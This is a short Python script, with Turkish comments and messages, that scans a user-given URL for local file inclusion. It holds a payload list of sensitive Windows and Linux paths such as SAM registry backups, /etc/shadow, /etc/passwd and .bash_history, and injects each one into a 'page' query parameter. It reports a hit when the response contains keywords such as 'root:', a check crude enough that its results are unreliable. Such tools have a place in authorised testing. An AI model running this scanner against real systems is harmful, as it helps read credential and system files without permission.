import requests


lfi_payloads = [
    # Windows için
    "C:\\boot.ini",
    "..\\..\\..\\..\\boot.ini",
    "%SYSTEMDRIVE%\\pagefile.sys",
    "%WINDIR%\\debug\\NetSetup.log",
    "%WINDIR%\\repair\\sam",
    "%WINDIR%\\repair\\system",
    "%WINDIR%\\repair\\software",
    "%WINDIR%\\repair\\security",
    "%WINDIR%\\system32\\logfiles\\w3svc1\\exYYMMDD.log",
    "%WINDIR%\\system32\\config\\AppEvent.Evt",
    "%WINDIR%\\system32\\config\\SecEvent.Evt",
    "%WINDIR%\\system32\\config\\default.sav",
    "%WINDIR%\\system32\\config\\security.sav",
    "%WINDIR%\\system32\\config\\software.sav",
    "%WINDIR%\\system32\\config\\system.sav",
    "%WINDIR%\\system32\\CCM\\logs\\*.log",
    "%USERPROFILE%\\ntuser.dat",
    "%USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat",
    "%WINDIR%\\System32\\drivers\\etc\\hosts",
    
    # Linux için
    "/etc/passwd",
    "/etc/resolv.conf",
    "/etc/motd",
    "/etc/issue",
    "/etc/passwd",
    "/etc/shadow",
    "/home/xxx/.bash_history",
    "/etc/issue{,.net}",
    "/etc/master.passwd",
    "/etc/group",
    "/etc/hosts",
    "/etc/crontab",
    "/etc/sysctl.conf",
    "/etc/syslog.conf",
    "/etc/chttp.conf",
    "/etc/lighttpd.conf",
    "/etc/cups/cupsd.conf",
    "/etc/inetd.conf",
    "/opt/lampp/etc/httpd.conf",
    "/etc/samba/smb.conf",
    "/etc/openldap/ldap.conf",
    "/etc/ldap/ldap.conf",
    "/etc/exports",
    "/etc/auto.master",
    "/etc/auto_master",
    "/etc/fstab"
]


def check_lfi_vulnerability(url):
    for payload in lfi_payloads:
        target_url = f"{url}?page={payload}"
        print(f"Testing: {target_url}")
        try:
            response = requests.get(target_url)
            response_text = response.text.lower()
            
            
            if any(keyword in response_text for keyword in ["root:", "[boot loader]", "application event log", "version", "system", "shadow"]):
                print(f"[!] LFI zafiyeti bulundu: {target_url}")
                return
        except requests.RequestException as e:
            print(f"[!] İstek sırasında bir hata oluştu: {e}")
            continue
    print("[+] LFI zafiyeti bulunamadı.")

if __name__ == "__main__":
    url = input("Lütfen kontrol etmek istediğiniz URL'yi girin: ")
    check_lfi_vulnerability(url)
